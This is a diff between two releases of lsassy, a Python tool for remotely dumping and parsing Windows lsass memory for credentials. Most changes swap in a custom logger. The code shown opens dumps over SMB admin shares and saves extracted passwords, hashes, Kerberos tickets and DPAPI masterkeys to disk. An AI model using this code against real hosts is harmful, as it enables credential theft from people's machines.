+│ │ -            logging.warning("Parsing error with '{}'".format(path), exc_info=True)
+│ │ +            lsassy_logger.warning("Parsing error with '{}'".format(path), exc_info=True)
+│ │              return None
+│ │  
+│ │          if self._open_share() is None:
+│ │              return None
+│ │  
+│ │          t = time.time()
+│ │          while True:
+│ │              try:
+│ │                  self._fid = self._session.smb_session.openFile(self._tid, self._fpath, desiredAccess=FILE_READ_DATA)
+│ │ -                logging.info("{} handle acquired".format(self._fpath))
+│ │ +                lsassy_logger.info("{} handle acquired".format(self._fpath))
+│ │                  break
+│ │              except Exception as e:
+│ │                  if time.time() - t > timeout:
+│ │ -                    logging.warning("Unable to open remote file {}".format( self._fpath), exc_info=True)
+│ │ +                    lsassy_logger.warning("Unable to open remote file {}".format( self._fpath), exc_info=True)
+│ │                      return None
+│ │ -                logging.debug("Unable to open remote file {}. Retrying...".format(self._fpath))
+│ │ +                lsassy_logger.debug("Unable to open remote file {}. Retrying...".format(self._fpath))
+│ │                  time.sleep(0.5)
+│ │  
+│ │          self._fileInfo = self._session.smb_session.queryInfo(self._tid, self._fid)
+│ │          self._endOfFile = self._fileInfo.fields["EndOfFile"]
+│ │          self._opened = True
+│ │          return self
+│ │   --- lsassy-3.1.6/lsassy/logger.py
+│ ├── +++ lsassy-3.1.7/lsassy/logger.py
+│ │┄ Files 25% similar despite different names
+│ │ @@ -1,30 +1,62 @@
+│ │  import logging
+│ │ -import os
+│ │  import sys
+│ │  
+│ │  
+│ │ +class LsassyLogger(logging.LoggerAdapter):
+│ │ +    def __init__(self):
+│ │ +        super().__init__(self)
+│ │ +        self.logger = logging.getLogger("lsassy")
+│ │ +        self.logger.propagate = False
+│ │ +        self.no_color = None
+│ │ +
+│ │ +        formatter = LsassyFormatter()
+│ │ +        handler = logging.StreamHandler(sys.stdout)
+│ │ +        handler.setFormatter(formatter)
+│ │ +        self.logger.addHandler(handler)
+│ │ +
+│ │ +    def lsassy_highlight(self, msg):
+│ │ +        """
+│ │ +        Highlight in yellow provided message
+│ │ +        :param msg: Message to lsassy_highlight
+│ │ +        :return: Highlighted message
+│ │ +        """
+│ │ +        if self.no_color:
+│ │ +            return msg
+│ │ +        return "\033[1;33m{}\033[0m".format(msg)
+│ │ +
+│ │ +
+│ │  class LsassyFormatter(logging.Formatter):
+│ │      """
+│ │      Custom formatting. Inspired by impacket "Logger" class
+│ │      """
+│ │ -
+│ │      def __init__(self, no_color=False):
+│ │ -        logging.Formatter.__init__(self, '%(bullet)s %(threadName)s %(message)s', None)
+│ │ -        self.no_color = no_color
+│ │ -        if self.no_color:
+│ │ -            self.BLUE, self.WHITE, self.YELLOW, self.RED, self.GREEN, self.NC = '', '', '', '', '', ''
+│ │ -        else:
+│ │ +        self.formatter = logging.Formatter.__init__(self, '%(bullet)s %(threadName)s %(message)s', None)
+│ │ +        self._no_color = no_color
+│ │ +        if not self._no_color:
+│ │              self.BLUE = '\033[1;34m'
+│ │              self.WHITE = '\033[1;37m'
+│ │              self.YELLOW = '\033[1;33m'
+│ │              self.RED = '\033[1;31m'
+│ │              self.GREEN = '\033[1;32m'
+│ │              self.NC = '\033[0m'
+│ │  
+│ │ +    @property
+│ │ +    def no_color(self):
+│ │ +        try:
+│ │ +            return self._no_color
+│ │ +        except AttributeError:
+│ │ +            return False
+│ │ +
+│ │ +    @no_color.setter
+│ │ +    def no_color(self, no_color):
+│ │ +        if no_color:
+│ │ +            self.BLUE, self.WHITE, self.YELLOW, self.RED, self.GREEN, self.NC = '', '', '', '', '', ''
+│ │ +        self._no_color = no_color
+│ │ +
+│ │      def format(self, record):
+│ │          """
+│ │          Custom bullet formatting with colors
+│ │          :param record: Record to log
+│ │          """
+│ │          if record.levelno == logging.INFO:
+│ │              record.bullet = '{}[*]{}'.format(self.BLUE, self.NC)
+│ │ @@ -34,40 +66,14 @@
+│ │              record.bullet = '{}[!]{}'.format(self.YELLOW, self.NC)
+│ │          elif record.levelno == logging.ERROR:
+│ │              record.bullet = '{}[x]{}'.format(self.RED, self.NC)
+│ │          else:
+│ │              record.bullet = '{}[+]{}'.format(self.GREEN, self.NC)
+│ │  
+│ │          # Only log stacktrace when log level is DEBUG
+│ │ -        if record.exc_info and logging.getLogger().getEffectiveLevel() != logging.DEBUG:
+│ │ +        if record.exc_info and logging.getLogger("lsassy").getEffectiveLevel() != logging.DEBUG:
+│ │              record.exc_info = None
+│ │  
+│ │          return logging.Formatter.format(self, record)
+│ │  
+│ │  
+│ │ -def highlight(msg):
+│ │ -    """
+│ │ -    Highlight in yellow provided message
+│ │ -    :param msg: Message to highlight
+│ │ -    :return: Highlighted message
+│ │ -    """
+│ │ -    if logging.no_color:
+│ │ -        return msg
+│ │ -    return "\033[1;33m{}\033[0m".format(msg)
+│ │ -
+│ │ -
+│ │ -def init(quiet=False, no_color=False):
+│ │ -    """
+│ │ -    StreamHandler and formatter added to root logger
+│ │ -    """
+│ │ -    if (logging.getLogger().hasHandlers()):
+│ │ -        logging.getLogger().handlers.clear()
+│ │ -    
+│ │ -    handler = logging.StreamHandler(sys.stdout)
+│ │ -    handler.setFormatter(LsassyFormatter(no_color))
+│ │ -    logging.getLogger().addHandler(handler)
+│ │ -    logging.getLogger().setLevel(logging.INFO)
+│ │ -
+│ │ -    logging.addLevelName(25, 'SUCCESS')
+│ │ -    setattr(logging, 'success', lambda message, *args: logging.getLogger()._log(25, message, args))
+│ │ -    setattr(logging, 'no_color', no_color)
+│ │ -    logging.getLogger().disabled = quiet
+│ │ +lsassy_logger = LsassyLogger()
+│ │   --- lsassy-3.1.6/lsassy/output/__init__.py
+│ ├── +++ lsassy-3.1.7/lsassy/output/__init__.py
+│ │┄ Files 10% similar despite different names
+│ │ @@ -1,14 +1,14 @@
+│ │  class IOutput:
+│ │      """
+│ │      Ouput interface
+│ │      """
+│ │ -
+│ │      def __init__(self, credentials, users_only=False, tickets=False, masterkeys=False):
+│ │          self._credentials = self.get_credentials(credentials, users_only, tickets, masterkeys)
+│ │ +        
+│ │  
+│ │      @staticmethod
+│ │      def _decode(data):
+│ │          """
+│ │          Ugly trick because of mixed content coming back from pypykatz
+│ │          Can be either string, bytes, None
+│ │          """
+│ │   --- lsassy-3.1.6/lsassy/output/json_output.py
+│ ├── +++ lsassy-3.1.7/lsassy/output/json_output.py
+│ │┄ Files identical despite different names
+│ │   --- lsassy-3.1.6/lsassy/output/pretty_output.py
+│ ├── +++ lsassy-3.1.7/lsassy/output/pretty_output.py
+│ │┄ Files 8% similar despite different names
+│ │ @@ -1,9 +1,9 @@
+│ │ -from lsassy import logger
+│ │  from lsassy.output import IOutput
+│ │ +from lsassy.logger import lsassy_logger
+│ │  
+│ │  
+│ │  class Output(IOutput):
+│ │      """
+│ │      Return output in pretty colorful format
+│ │      """
+│ │      def get_output(self):
+│ │ @@ -28,12 +28,12 @@
+│ │                  if [cred["domain"], cred["username"], cred["password"]] not in credentials:
+│ │                      credentials.append([cred["domain"], cred["username"], cred["password"]])
+│ │                      output.append(
+│ │                          "{}{}{}{}{}{}".format(
+│ │                              ('{}\\'.format(cred["domain"]) if cred["domain"] is not None and cred["domain"] != "" else " "),
+│ │                              cred["username"],
+│ │                              " " * (max_size - len(cred["domain"]) - len(cred["username"]) + 2),
+│ │ -                            logger.highlight("[{}] ".format(cred_type)),
+│ │ -                            logger.highlight(cred["password"]),
+│ │ -                            " | {}".format(logger.highlight("[{}] {}".format("SHA1", cred["sha1"]))) if cred["sha1"] else "")
+│ │ +                            lsassy_logger.lsassy_highlight("[{}] ".format(cred_type)),
+│ │ +                            lsassy_logger.lsassy_highlight(cred["password"]),
+│ │ +                            " | {}".format(lsassy_logger.lsassy_highlight("[{}] {}".format("SHA1", cred["sha1"]))) if cred["sha1"] else "")
+│ │                      )
+│ │          return "\n".join(output)
+│ │   --- lsassy-3.1.6/lsassy/output/table_output.py
+│ ├── +++ lsassy-3.1.7/lsassy/output/table_output.py
+│ │┄ Files identical despite different names
+│ │   --- lsassy-3.1.6/lsassy/parser.py
+│ ├── +++ lsassy-3.1.7/lsassy/parser.py
+│ │┄ Files 4% similar despite different names
+│ │ @@ -1,36 +1,34 @@
+│ │ -from doctest import master
+│ │ -import logging
+│ │  from datetime import datetime
+│ │ -
+│ │  from pypykatz.pypykatz import pypykatz
+│ │ -
+│ │  from lsassy.credential import Credential
+│ │ +from lsassy.logger import lsassy_logger
+│ │  
+│ │  
+│ │  class Parser:
+│ │      """
+│ │      Parse remote lsass dump file using impacketfile and pypykatz
+│ │      """
+│ │  
+│ │      def __init__(self, dumpfile):
+│ │          self._dumpfile = dumpfile
+│ │ +        
+│ │  
+│ │      def parse(self):
+│ │          """
+│ │          Parse remote dump file and delete it after parsing
+│ │          :return: List of Credentials
+│ │          """
+│ │          credentials = []
+│ │          tickets = []
+│ │          masterkeys = []
+│ │          try:
+│ │              pypy_parse = pypykatz.parse_minidump_external(self._dumpfile, chunksize = 60*1024)
+│ │          except Exception as e:
+│ │ -            logging.error("An error occurred while parsing lsass dump", exc_info=True)
+│ │ +            lsassy_logger.error("An error occurred while parsing lsass dump", exc_info=True)
+│ │              return None
+│ │  
+│ │          ssps = ['msv_creds', 'wdigest_creds', 'ssp_creds', 'livessp_creds', 'kerberos_creds', 'credman_creds',
+│ │                  'tspkg_creds', 'dpapi_creds']
+│ │          for luid in pypy_parse.logon_sessions:
+│ │              for ssp in ssps:
+│ │                  for cred in getattr(pypy_parse.logon_sessions[luid], ssp, []):
+│ │   --- lsassy-3.1.6/lsassy/session.py
+│ ├── +++ lsassy-3.1.7/lsassy/session.py
+│ │┄ Files 19% similar despite different names
+│ │ @@ -1,9 +1,9 @@
+│ │ -import logging
+│ │  from impacket.smbconnection import SMBConnection
+│ │ +from lsassy.logger import lsassy_logger
+│ │  
+│ │  
+│ │  class Session:
+│ │      """
+│ │      Custom impacket SMB session
+│ │      """
+│ │      def __init__(self, smb_session=None):
+│ │ @@ -16,14 +16,15 @@
+│ │          self.lmhash = ""
+│ │          self.nthash = ""
+│ │          self.domain = ""
+│ │          self.aesKey = ""
+│ │          self.dc_ip = ""
+│ │          self.kerberos = False
+│ │          self.timeout = 5
+│ │ +        
+│ │  
+│ │      def get_session(self, address, target_ip="", port=445, username="", password="", lmhash="", nthash="", domain="", aesKey="", dc_ip="", kerberos=False, timeout=5):
+│ │          """
+│ │          Login on remote host
+│ │          :param address: Remote host
+│ │          :param target_ip: Remote host IP address
+│ │          :param port: Remote port
+│ │ @@ -36,39 +37,41 @@
+│ │          :param dc_ip: Domain Controller IP address
+│ │          :param kerberos: Use kerberos
+│ │          :return: SMB Session
+│ │          """
+│ │          try:
+│ │              self.smb_session = SMBConnection(address, target_ip, None, sess_port=port, timeout=timeout)
+│ │          except Exception:
+│ │ -            logging.warning("Network error", exc_info=True)
+│ │ +            lsassy_logger.warning("Network error", exc_info=True)
+│ │              self.smb_session = None
+│ │              return None
+│ │ +        lsassy_logger.debug(f"smb_session: {self.smb_session}")
+│ │  
+│ │          try:
+│ │              if kerberos is True:
+│ │                  self.smb_session.kerberosLogin(username, password, domain, lmhash, nthash, aesKey, dc_ip)
+│ │              else:
+│ │                  self.smb_session.login(username, password, domain, lmhash, nthash)
+│ │ -            logging.info("SMB session opened")
+│ │ +            lsassy_logger.info("SMB session opened")
+│ │          except Exception as e:
+│ │              if "KDC_ERR_S_PRINCIPAL_UNKNOWN" in str(e):
+│ │ -                logging.error("Connexion error (Use FQDN for kerberos authentication)", exc_info=True)
+│ │ +                lsassy_logger.error("Connection error (Use FQDN for kerberos authentication)", exc_info=True)
+│ │              else:
+│ │ -                logging.warning("Connexion error", exc_info=True)
+│ │ +                lsassy_logger.error("Connection error", exc_info=True)
+│ │              self.smb_session = None
+│ │              return None
+│ │  
+│ │          try:
+│ │ +            lsassy_logger.debug(f"Connecting to C$")
+│ │              self.smb_session.connectTree("C$")
+│ │          except Exception:
+│ │              if username:
+│ │ -                logging.error("User '{}' can not access admin shares on {}".format(username, address))
+│ │ +                lsassy_logger.error("User '{}' can not access admin shares on {}".format(username, address))
+│ │              else:
+│ │ -                logging.error("Can not access admin shares on {}".format(address))
+│ │ +                lsassy_logger.error("Can not access admin shares on {}".format(address))
+│ │              self.smb_session = None
+│ │              return None
+│ │  
+│ │          self.address = address
+│ │          self.target_ip = target_ip
+│ │          self.port = port
+│ │          self.username = username
+│ │ @@ -77,13 +80,13 @@
+│ │          self.nthash = nthash
+│ │          self.domain = domain
+│ │          self.aesKey = aesKey
+│ │          self.dc_ip = dc_ip
+│ │          self.kerberos = kerberos
+│ │          self.timeout = timeout
+│ │  
+│ │ -        logging.success("Authentication successful")
+│ │ +        lsassy_logger.info("Authentication successful")
+│ │          return True
+│ │  
+│ │      def login(self):
+│ │          return self.get_session(self.address, self.target_ip, self.port, self.username, self.password, self.lmhash,
+│ │                           self.nthash, self.domain, self.aesKey, self.dc_ip, self.kerberos, self.timeout)
+│ │   --- lsassy-3.1.6/lsassy/utils.py
+│ ├── +++ lsassy-3.1.7/lsassy/utils.py
+│ │┄ Files identical despite different names
+│ │   --- lsassy-3.1.6/lsassy/writer.py
+│ ├── +++ lsassy-3.1.7/lsassy/writer.py
+│ │┄ Files 17% similar despite different names
+│ │ @@ -1,33 +1,34 @@
+│ │  import importlib
+│ │ -import logging
+│ │  import os
+│ │  from pathlib import Path
+│ │ +from lsassy.logger import lsassy_logger
+│ │  
+│ │  
+│ │  class Writer:
+│ │      """
+│ │      Class used to write output results either on screen and/or in a file
+│ │      """
+│ │      def __init__(self, credentials, tickets, masterkeys):
+│ │          self._credentials = credentials
+│ │          self._tickets = tickets
+│ │          self._masterkeys = masterkeys
+│ │ +        
+│ │  
+│ │      def get_output(self, out_format, users_only=False, tickets=False, masterkeys=False):
+│ │          """
+│ │          Get credentials output in given format
+│ │          :param out_format: Format from output package
+│ │          :param users_only: If set, only returns users account, else returns users and computers accounts
+│ │          :return: Output string
+│ │          """
+│ │          try:
+│ │              output_method = importlib.import_module("lsassy.output.{}_output".format(out_format.lower()), "Output").Output(self._credentials, users_only, tickets, masterkeys)
+│ │          except ModuleNotFoundError:
+│ │ -            logging.error("Output module '{}' doesn't exist".format(out_format.lower()), exc_info=True)
+│ │ +            lsassy_logger.error("Output module '{}' doesn't exist".format(out_format.lower()), exc_info=True)
+│ │              return None
+│ │  
+│ │          return output_method.get_output()
+│ │  
+│ │      def write(self, file_format, out_format="pretty", output_file=None, quiet=False, users_only=False, tickets=False, masterkeys=False, kerberos_dir=None, masterkeys_file=None):
+│ │  
+│ │          """
+│ │ @@ -47,67 +48,67 @@
+│ │              file_format = out_format
+│ │              file_content = output
+│ │  
+│ │          else:
+│ │              file_content = self.get_output(file_format, users_only, tickets, masterkeys)
+│ │  
+│ │          if output is None:
+│ │ -            logging.error("An error occurred while writing credentials", exc_info=True)
+│ │ +            lsassy_logger.error("An error occurred while writing credentials", exc_info=True)
+│ │              return None
+│ │  
+│ │          if not quiet:
+│ │              for line in output.split("\n"):
+│ │ -                logging.success(line)
+│ │ +                print(line)
+│ │  
+│ │          if output_file is not None:
+│ │              path = Path(output_file).parent
+│ │              if not os.path.isdir(path):
+│ │ -                logging.error("Directory {} does not exist".format(path))
+│ │ +                lsassy_logger.error("Directory {} does not exist".format(path))
+│ │                  return None
+│ │  
+│ │              with open(output_file, 'a+') as f:
+│ │                  f.write(file_content + "\n")
+│ │ -            logging.success("Credentials saved to {}".format(output_file))
+│ │ +            print("Credentials saved to {}".format(output_file))
+│ │  
+│ │          self.write_tickets(kerberos_dir, quiet)
+│ │          self.write_masterkeys(masterkeys_file, quiet)
+│ │  
+│ │ -        return True
+│ │ +        return output
+│ │  
+│ │      def write_tickets(self, kerberos_dir=None, quiet=False):
+│ │          """
+│ │          Output masterkeys to file
+│ │          :param kerberos_dir: Output dir
+│ │          :param quiet: If set, doesn't display on stdout
+│ │          """
+│ │          if kerberos_dir is None:
+│ │              if os.name == 'nt':
+│ │                  abs_dir = '%LocalAppData%\\lsassy\\tickets'
+│ │              else:
+│ │                  abs_dir = os.path.expanduser('~') + '/.config/lsassy/tickets'
+│ │          else:
+│ │              if len(self._tickets) == 0 and not quiet:
+│ │ -                logging.warning("No kerberos tickets found")
+│ │ +                lsassy_logger.warning("No kerberos tickets found")
+│ │                  return True
+│ │              abs_dir = os.path.abspath(kerberos_dir)
+│ │  
+│ │          if len(self._tickets) > 0:
+│ │              if not os.path.exists(abs_dir):
+│ │                  try:
+│ │                      os.makedirs(abs_dir)
+│ │                  except Exception as e:
+│ │ -                    logging.warning("Cannot create %s for saving kerberos tickets" % abs_dir, exc_info=True)
+│ │ +                    lsassy_logger.warning("Cannot create %s for saving kerberos tickets" % abs_dir, exc_info=True)
+│ │                      return True
+│ │              for ticket in self._tickets:
+│ │                  ticket.to_kirbi(abs_dir)
+│ │              if not quiet:
+│ │                  if len(self._tickets) > 1:
+│ │ -                    logging.success("%s Kerberos tickets written to %s" % (len(self._tickets),abs_dir))
+│ │ +                    print("%s Kerberos tickets written to %s" % (len(self._tickets),abs_dir))
+│ │                  else:
+│ │ -                    logging.success("%s Kerberos ticket written to %s" % (len(self._tickets),abs_dir))
+│ │ +                    print("%s Kerberos ticket written to %s" % (len(self._tickets),abs_dir))
+│ │  
+│ │          return True
+│ │      
+│ │      def write_masterkeys(self, masterkeys_file=None, quiet=False):
+│ │          """
+│ │          Output masterkeys to file
+│ │          :param masterkeys_file: Output file
+│ │ @@ -116,21 +117,21 @@
+│ │          if masterkeys_file is None:
+│ │              if os.name == 'nt':
+│ │                  abs_dir = '%LocalAppData%\\lsassy\\masterkeys.txt'
+│ │              else:
+│ │                  abs_dir = os.path.expanduser('~') + '/.config/lsassy/masterkeys.txt'
+│ │          else:
+│ │              if len(self._masterkeys) == 0 and not quiet:
+│ │ -                logging.warning("No DPAPI masterkey found")
+│ │ +                lsassy_logger.warning("No DPAPI masterkey found")
+│ │                  return True
+│ │              abs_dir = os.path.abspath(masterkeys_file)
+│ │  
+│ │          if len(self._masterkeys) == 0:
+│ │              if not quiet:
+│ │ -                logging.warning("No masterkey found")
+│ │ +                lsassy_logger.warning("No masterkey found")
+│ │              return True
+│ │          with open(abs_dir,'a+') as file:
+│ │              for mk in self._masterkeys:
+│ │                  file.write(mk+'\n')
+│ │          if not quiet:
+│ │ -            logging.success("{} masterkeys saved to {}".format(len(self._masterkeys), abs_dir))
+│ │ +            print("{} masterkeys saved to {}".format(len(self._masterkeys), abs_dir))
+│ │          return True
+│ │   --- lsassy-3.1.6/lsassy.egg-info/PKG-INFO
+│ ├── +++ lsassy-3.1.7/lsassy.egg-info/PKG-INFO
+│ │┄ Files 0% similar despite different names
+│ │ @@ -1,10 +1,10 @@
+│ │  Metadata-Version: 2.1
+│ │  Name: lsassy
+│ │ -Version: 3.1.6
+│ │ +Version: 3.1.7
+│ │  Summary: Python library to extract credentials from lsass remotely
+│ │  Home-page: https://github.com/Hackndo/lsassy/
+│ │  Author: Pixis
+│ │  Author-email: hackndo@gmail.com
+│ │  License: MIT
+│ │  Classifier: Programming Language :: Python :: 3.6
+│ │  Classifier: Programming Language :: Python :: 3.7
+│ │ @@ -13,16 +13,15 @@
+│ │  Classifier: License :: OSI Approved :: MIT License
+│ │  Classifier: Operating System :: OS Independent
+│ │  Requires-Python: >=3.6
+│ │  Description-Content-Type: text/markdown
+│ │  License-File: LICENSE
+│ │  
+│ │  # lsassy
+│ │ -
+│ │ -[![PyPI version](https://d25lcipzij17d.cloudfront.net/badge.svg?id=py&type=6&v=3.1.6&x2=0)](https://pypi.org/project/lsassy/)
+│ │ +[![PyPI version](https://d25lcipzij17d.cloudfront.net/badge.svg?id=py&type=6&v=v3.1.7&x2=0)](https://pypi.org/project/lsassy)
+│ │  [![PyPI Statistics](https://img.shields.io/pypi/dm/lsassy.svg)](https://pypistats.org/packages/lsassy)
+│ │  [![Tests](https://github.com/hackndo/lsassy/workflows/Tests/badge.svg)](https://github.com/hackndo/lsassy/actions?workflow=Tests)
+│ │  [![Twitter](https://img.shields.io/twitter/follow/hackanddo?label=HackAndDo&style=social)](https://twitter.com/intent/follow?screen_name=hackanddo)
+│ │  
+│ │  <a href="https://asciinema.org/a/441582?autoplay=1" target="_blank"><img src="https://asciinema.org/a/441582.svg" width="80%"></a>
+│ │  
+│ │  Python tool to remotely extract credentials on a set of hosts. This [blog post](https://en.hackndo.com/remote-lsass-dump-passwords/) explains how it works.
+│ │ ├── html2text {}
+│ │ │ @@ -1,17 +1,17 @@
+│ │ │ -Metadata-Version: 2.1 Name: lsassy Version: 3.1.6 Summary: Python library to
+│ │ │ +Metadata-Version: 2.1 Name: lsassy Version: 3.1.7 Summary: Python library to
+│ │ │  extract credentials from lsass remotely Home-page: https://github.com/Hackndo/
+│ │ │  lsassy/ Author: Pixis Author-email: hackndo@gmail.com License: MIT Classifier:
+│ │ │  Programming Language :: Python :: 3.6 Classifier: Programming Language ::
+│ │ │  Python :: 3.7 Classifier: Programming Language :: Python :: 3.8 Classifier:
+│ │ │  Programming Language :: Python :: 3.9 Classifier: License :: OSI Approved ::
+│ │ │  MIT License Classifier: Operating System :: OS Independent Requires-Python:
+│ │ │  >=3.6 Description-Content-Type: text/markdown License-File: LICENSE # lsassy [!
+│ │ │  [PyPI version](https://d25lcipzij17d.cloudfront.net/
+│ │ │ -badge.svg?id=py&type=6&v=3.1.6&x2=0)](https://pypi.org/project/lsassy/) [![PyPI
+│ │ │ +badge.svg?id=py&type=6&v=v3.1.7&x2=0)](https://pypi.org/project/lsassy) [![PyPI
+│ │ │  Statistics](https://img.shields.io/pypi/dm/lsassy.svg)](https://pypistats.org/
+│ │ │  packages/lsassy) [![Tests](https://github.com/hackndo/lsassy/workflows/Tests/
+│ │ │  badge.svg)](https://github.com/hackndo/lsassy/actions?workflow=Tests) [!
+│ │ │  [Twitter](https://img.shields.io/twitter/follow/
+│ │ │  hackanddo?label=HackAndDo&style=social)](https://twitter.com/intent/
+│ │ │  follow?screen_name=hackanddo) [https://asciinema.org/a/441582.svg] Python tool
+│ │ │  to remotely extract credentials on a set of hosts. This [blog post](https://
+│ │   --- lsassy-3.1.6/lsassy.egg-info/SOURCES.txt
+│ ├── +++ lsassy-3.1.7/lsassy.egg-info/SOURCES.txt
+│ │┄ Files identical despite different names
+│ │   --- lsassy-3.1.6/pyproject.toml
+│ ├── +++ lsassy-3.1.7/pyproject.toml
+│ │┄ Files 5% similar despite different names
+│ │ @@ -1,22 +1,22 @@
+│ │  [tool.poetry]
+│ │  name = "lsassy"
+│ │ -version = "3.1.6"
+│ │ +version = "3.1.7"
+│ │  description = "Tool to remotely extract credentials"
+│ │  readme = "README.md"
+│ │  homepage = "https://github.com/hackndo/lsassy"
+│ │  repository = "https://github.com/hackndo/lsassy"
+│ │  keywords = ["lsassy", "lsass", "pypykatz", "credentials"]
+│ │  authors = ["pixis <hackndo@gmail.com>"]
+│ │  
+│ │  [tool.poetry.dependencies]
+│ │  python = "^3.7"
+│ │  netaddr = "^0.8.0"
+│ │ -pypykatz = "^0.6.2"
+│ │ -impacket = "^0.9.22"
+│ │ +pypykatz = "^0.6.3"
+│ │ +impacket = "^0.10.0"
+│ │  rich = "^10.6.0"
+│ │  
+│ │  [tool.poetry.dev-dependencies]
+│ │  pytest = "^6.2.1"
+│ │  coverage = "^5.3.1"
+│ │  pytest-cov = "^2.10.1"
+│ │  nox = "^2020.8.22"
+│ │   --- lsassy-3.1.6/setup.py
+│ ├── +++ lsassy-3.1.7/setup.py
+│ │┄ Files 2% similar despite different names
+│ │ @@ -9,29 +9,29 @@
+│ │  from setuptools import setup, find_packages
+│ │  
+│ │  HERE = pathlib.Path(__file__).parent
+│ │  README = (HERE / "README.md").read_text()
+│ │  
+│ │  setup(
+│ │      name="lsassy",
+│ │ -    version="3.1.6",
+│ │ +    version="3.1.7",
+│ │      author="Pixis",
+│ │      author_email="hackndo@gmail.com",
+│ │      description="Python library to extract credentials from lsass remotely",
+│ │      long_description=README,
+│ │      long_description_content_type="text/markdown",
+│ │      packages=find_packages(exclude=["assets"]),
+│ │      include_package_data=True,
+│ │      url="https://github.com/Hackndo/lsassy/",
+│ │      zip_safe = True,
+│ │      license="MIT",
+│ │      install_requires=[
+│ │          'impacket',
+│ │          'netaddr',
+│ │ -        'pypykatz>=0.6.2',
+│ │ +        'pypykatz>=0.6.3',
+│ │          'rich'
+│ │      ],
+│ │      python_requires='>=3.6',
+│ │      classifiers=(
+│ │          "Programming Language :: Python :: 3.6",
+│ │          "Programming Language :: Python :: 3.7",
+│ │          "Programming Language :: Python :: 3.8",
